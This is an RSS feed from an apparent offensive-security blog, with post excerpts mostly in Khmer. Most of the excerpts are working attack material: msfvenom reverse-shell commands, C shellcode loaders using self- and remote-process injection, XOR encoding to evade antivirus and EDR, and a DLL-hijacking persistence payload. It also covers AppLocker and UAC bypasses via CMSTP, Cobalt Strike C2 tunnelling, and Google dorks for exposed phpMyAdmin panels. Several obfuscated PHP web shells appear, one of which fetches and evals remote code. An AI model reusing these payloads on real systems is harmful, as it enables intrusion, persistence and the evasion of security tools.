<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>ThikLab - CyberSec</title>
    <link>http://localhost:1313/en/</link>
    <description>Recent content on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Wed, 21 Jun 2023 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="http://localhost:1313/en/index.xml" rel="self" type="application/rss+xml" />
    
      
      
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      

      
      <item>
        <title>Evading AV/EDR with Junk Bytes</title>
        <link>http://localhost:1313/en/posts/evading-avedr-with-junk-bytes/</link>
        <pubDate>Tue, 27 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 27 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/evading-avedr-with-junk-bytes/</guid>
        <description>ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Metasploit Framework ។
Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>Evading</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection - Bypass AV/EDR with XOR - 0x01</title>
        <link>http://localhost:1313/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
        <description>Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   XOR Shellcode បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖
1 2 3 4 5 6 7 8 9 10  raw_shellcode = &amp;#34;my shellcode \xaa\xda\xca\[...]\xbe\x14\x49&amp;#34; enc_shellcode = [] print (&amp;#34;[+] Shellcode is encoding&amp;#34;) for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>xor</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection without Write/Execute Permission</title>
        <link>http://localhost:1313/en/posts/process-injection-without-write-exec-permission/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/process-injection-without-write-exec-permission/</guid>
        <description>Pwn Self Injection បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Executable Allocation) ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf(&amp;#34;Injecting to PID: %i&amp;#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &amp;amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection - Self Injection Method</title>
        <link>http://localhost:1313/en/posts/process-injection-self-injection-method/</link>
        <pubDate>Tue, 20 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 20 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/process-injection-self-injection-method/</guid>
        <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>CobaltStrike Over WAN Connection</title>
        <link>http://localhost:1313/en/posts/cobaltstrike-overwan-connection/</link>
        <pubDate>Tue, 06 Dec 2022 22:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 06 Dec 2022 22:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/cobaltstrike-overwan-connection/</guid>
        <description>ខាងក្រោមនេះជាគំនិតផ្ទាល់ខ្លួនក្នុងការតភ្ជាប់ Teamserver និងប្រើប្រាស់ពាក្យបញ្ជាតាមរយៈ Beacons ពីចំងាយដោយមិនចាំបាច់បើក Port Forwarding ។
Requirements  CobaltStrike Telebit  Telebit Setup ចំណាំ៖ ចូលទៅកាន់ telebit.cloud ដើម្បីយល់ដឹងបន្ថែមអំពី Configuration ។
នៅក្នុងលីនុចសូមបើកផ្ទាំង Terminal រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
1 2  // Install Telebit curl https://get.telebit.io/ | bash   ក្រោយពីបំពេញអាសយដ្ឋាន Email រួចសូមចូលទៅកាន់ផ្ទាំង Inbox រួចបើកដំណើរដំណភ្ជាប់ដែលគេបានផ្ញើមក និងចម្លងចូលនូវលេខទាំង ៤ ខ្ទង់នោះដើម្បីផ្ទៀងផ្ទាត់ ។
ប្រសិនបើមិនមានអ្វីខុសឆ្គងទេ យើងនឹងទទួលបានសារបញ្ជាក់ពីភាពជោគជ័យដូចខាងក្រោម៖
Usage តស់! ឥលូវចាប់ផ្ដើមធ្វើការកំណត់នៅលេខ Port សម្រាប់តភ្ជាប់ទៅកាន់ Teamserver និង Beacons
1 2 3 4 5  // Setup Teamserver Port ~/telebit tcp 50050 // Setup HTTP Beacon ~/telebit http 80 //don&amp;#39;t change the port   Teamserver Connection បន្ទាប់មកសូមវាយពាក្យបញ្ជាដូចខាងក្រោមដើម្បីបើកដំណើរការ Teamserver</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/cobaltstrike.jpg" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>tunnel</category>
            
          
            
              <category>over-wan</category>
            
          
        
        
          
            
              <category>C2</category>
            
          
        
        
          
            
              <category>CobaltStrike</category>
            
          
        
      </item>
      
      <item>
        <title>DLL Hijacking - Persistence Method</title>
        <link>http://localhost:1313/en/posts/dll-hijacking-persistence-method/</link>
        <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/dll-hijacking-persistence-method/</guid>
        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>persistence</category>
            
          
        
        
          
            
              <category>DLL Hijacking</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>1 Byte Changed Evading Antivirus</title>
        <link>http://localhost:1313/en/posts/1byte-changed-evading-av/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/1byte-changed-evading-av/</guid>
        <description>1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖
សូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \xfc ។
តស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖
ប្ដូរ \xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \xfd, \x3a, \x6f\ ។ល។រក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = &#34;\xfc&#34;;Build ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។ខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
        
        
        
          
            
              <category>CobaltStrike</category>
            
          
        
      </item>
      
      <item>
        <title>Impersonate SSL - MSF Bypass Detection</title>
        <link>http://localhost:1313/en/posts/bypass-detection-msf-shell/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/bypass-detection-msf-shell/</guid>
        <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។
បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>metasploit</category>
            
          
            
              <category>ssl</category>
            
          
            
              <category>bypass</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>AppLocker Bypass - CMSTP</title>
        <link>http://localhost:1313/en/posts/applocker-cmstp-bypass/</link>
        <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/applocker-cmstp-bypass/</guid>
        <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖
1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។
DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>inf</category>
            
          
            
              <category>sct</category>
            
          
        
        
          
            
              <category>CMSTP</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Bypass UAC DLL Method</title>
        <link>http://localhost:1313/en/posts/bypass-uac-dll-method/</link>
        <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/bypass-uac-dll-method/</guid>
        <description>ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។
C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>bypass</category>
            
          
        
        
          
            
              <category>UAC</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Upload Shell Via phpMyAdmin</title>
        <link>http://localhost:1313/en/posts/upload-shell-via-phpmyadmin/</link>
        <pubDate>Thu, 01 Apr 2021 10:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/upload-shell-via-phpmyadmin/</guid>
        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, &amp;ldquo;uploader&amp;rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖
1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   និងកូដខាងក្រោមនេះទៀត៖
1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   បន្ទាប់មកចូលទៅកាន់ Table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&amp;#34;Content-Type&amp;#34; content=&amp;#34;text/html; charset=utf-8&amp;#34; /&amp;gt; &amp;lt;title&amp;gt;Uploader&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body bgcolor=&amp;#34;black&amp;#34;&amp;gt; &amp;lt;center&amp;gt; &amp;lt;div style=&amp;#34;color:white;margin-top:150px;&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Uploader&amp;lt;/h1&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;form enctype=&amp;#34;multipart/form-data&amp;#34; action=&amp;#34;uploader.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>fileupload</category>
            
          
            
              <category>google-dork</category>
            
          
            
              <category>phpmyadmin</category>
            
          
        
        
          
            
              <category>SQLi</category>
            
          
        
        
          
            
              <category>WebApp</category>
            
          
        
      </item>
      
      <item>
        <title>HackTheBox - Traceback</title>
        <link>http://localhost:1313/en/posts/traceback-10-10-10-181/</link>
        <pubDate>Sat, 21 Nov 2020 11:38:55 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 21 Nov 2020 11:38:55 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/traceback-10-10-10-181/</guid>
        <description>Recon ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  :~$ sudo nmap -sC -sV 10.10.10.181 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 13:29 +07 Nmap scan report for 10.10.10.181 Host is up (0.29s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
        
        
          
            
              <category>HTB</category>
            
          
        
      </item>
      
      <item>
        <title>Self Signed Certification</title>
        <link>http://localhost:1313/en/posts/self-signed-certification/</link>
        <pubDate>Tue, 02 Jun 2020 16:22:34 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 02 Jun 2020 16:22:34 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/self-signed-certification/</guid>
        <description>តើមានវិធីអ្វីដែលអាចធ្វើ Code Signing ទៅលើ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?
ខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖
Generate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន Certificate ច្រើនជាងមួយ។
Import as Trusted Publisher 1  Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>code-signing</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>UniSh3ll Tutorial</title>
        <link>http://localhost:1313/en/posts/unishell/</link>
        <pubDate>Tue, 26 May 2020 14:28:44 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 26 May 2020 14:28:44 +0700</atom:modified>
        <guid>http://localhost:1313/en/posts/unishell/</guid>
        <description>UniSh3ll-I 1  &amp;lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system&amp;amp;0=id;ls+-la    UniSh3ll-II 1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;\r&amp;lt;?=&amp;#39;404 Not found&amp;#39;;?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   របៀបប្រើ៖ curl localhost/unish3ll.php -d _=ls+-la
UniSh3ll-III 1  &amp;lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&amp;amp;$ឋ[ម]($ឋ[ប]); //.php?ត=true&amp;amp;ល=រងារ&amp;amp;ម=passthru&amp;amp;ប=ls    1  &amp;lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&amp;amp;$ឋ[ម]($ឋ[ប]); eval(&amp;#39;?&amp;gt;&amp;#39;.file_get_contents($ឋ[ដ]));?&amp;gt;   របៀបប្រើ៖ unish3ll.php?ត=true&amp;amp;ល=រងារ&amp;amp;ម=passthru&amp;amp;ប=id&amp;amp;ដ=https://pastebin.com/raw/xxxxx
